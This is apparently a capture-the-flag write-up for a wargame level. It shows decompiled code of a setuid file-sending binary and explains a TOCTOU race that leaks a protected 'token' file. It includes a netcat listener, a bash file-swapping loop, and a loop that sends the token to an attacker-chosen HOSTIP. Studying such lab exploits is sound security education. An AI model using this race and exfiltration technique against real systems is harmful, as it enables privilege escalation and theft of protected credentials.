# Level10 Writeup
 
## Info
 
User `level10` has a setuid `flag10` ELF binary `level10` and a read protected file `token` owned by user `flag10`. 

`level10`
```c
int main(int argc,char **argv) {
  char *__cp; // Ghidra mess
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  char *file;
  char *host;
  int fd;
  int ffd;
  int rc;
  char buffer [4096];
  sockaddr_in sin;
  undefined local_1024 [4096];
  uint local_24;
  in_addr_t local_20;
  undefined4 local_1c;
  undefined4 local_18;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) { // Wrong number of args message
    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
    exit(1);
  }
  pcVar6 = argv[1];
  __cp = argv[2];
  iVar2 = access(argv[1],4); // Check if we have acess to the file
  if (iVar2 == 0) { // We have access
    printf("Connecting to %s:6969 .. ",__cp); // Sends file to server
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_20 = 0;
    local_1c = 0;
    local_18 = 0;
    local_24 = 2;
    local_20 = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24 = local_24 & 0xffff | (uint)uVar1 << 0x10;
    iVar3 = connect(iVar2,(sockaddr *)&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp); // Error Message
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp); // Error message
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file"); // File Can't be opened
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6); // Attempt to read file
      exit(1);
    }
    write(iVar2,local_1024,__n);// Write the file contents
    iVar2 = puts("wrote file!");
  }
  else { // We Don't have acess
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) { // Buffer overflow pervention
    __stack_chk_fail();
  }
  return iVar2;
}

```

`level10` program takes 2 arguments, a file to send and a host on port 6969 to send the file too. Attempting to send `token` fails, since `level10` checks if the user executing the program has the permisions to read the file, erroring out if they don't.
 
There are 2 problems to solve, getting the data that is sent to the host and getting `level10` to read the contents of `token`.
 
## Reading contents of the file sent
 
We can start netcat listening on port 6969 like so `nc -l 6969`

## Sending the contents of `token`
 
Simply by swapping the names of a file we create and `token` very fast, we can cause a race condition. This condition is when the program sees that we have the correct permissions to read the file and the time it reads the content and sends it. If when the file is checked it checks our file and when the program reads the file it reads `token`, then we have won the race.
 
Example script to swap files:
``` bash
while [ 1 ]
do
       mv token temp
       mv file token
       mv temp file
done
```
 
## Victory
 
After winning the race, we can use the contents of `token` as a password for `flag10` and get the flag from the output of the ncat command.

Instead of spaming the command, we can use `while [ 1 ]; do ./level10 token HOSTIP; done` to automate it.
 

